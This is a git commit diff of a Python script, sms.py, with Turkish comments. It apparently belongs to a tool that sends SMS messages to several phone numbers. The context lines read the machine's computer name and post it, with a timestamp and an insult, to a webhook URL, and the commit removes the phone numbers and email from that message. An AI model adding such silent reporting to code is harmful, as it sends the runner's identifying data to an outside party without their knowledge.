44fd6a6923c0d2084502f9e64862664533ce3ad5
fourtel <125697683+fourtel@users.noreply.github.com>
2023-02-18 00:05:41 +0300

    Update sms.py

--- sms.py
+++ sms.py
@@ -16,7 +16,7 @@ tarih = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 bilgisayar_adi = os.environ['COMPUTERNAME']
 
 # Mesajı hazırla ve webhook URL'sine gönder
-mesaj = f"{tarih} - {bilgisayar_adi} - {phone, phone2,phone3,phone4,phone5} - {mail} numarasına sms yolladı piğç "
+mesaj = f"{tarih} - {bilgisayar_adi} - numarasına sms yolladı piğç "
 requests.post(webhook_url, json={"content": mesaj})
 
 class SendSms():
